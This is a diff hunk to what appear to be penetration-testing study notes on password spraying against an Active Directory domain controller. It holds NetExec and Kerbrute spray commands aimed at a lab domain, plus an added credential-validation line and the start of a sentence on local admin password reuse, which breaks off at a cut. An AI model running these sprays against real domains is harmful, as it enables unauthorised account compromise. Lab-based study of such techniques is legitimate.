@@ -35,9 +35,12 @@ After that, we can start attempting to actually perform password spray:
 ```
 sudo nxc smb <dcip> -u <userlist> -p <password> | grep +
 #grep + only show sucess result
+sudo nxc smb <dcip> -u <username> -p <password> #To validate the credential we got
 ```
 
 -Using Kerbrute for password spraying:
 ```
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 <userlist> <password>
 ```
+
+Each computer requires some sort of configuring before they are joined to a domain, and if we are able to obtain the password / hash for a local administrator account, their is a good chance that 
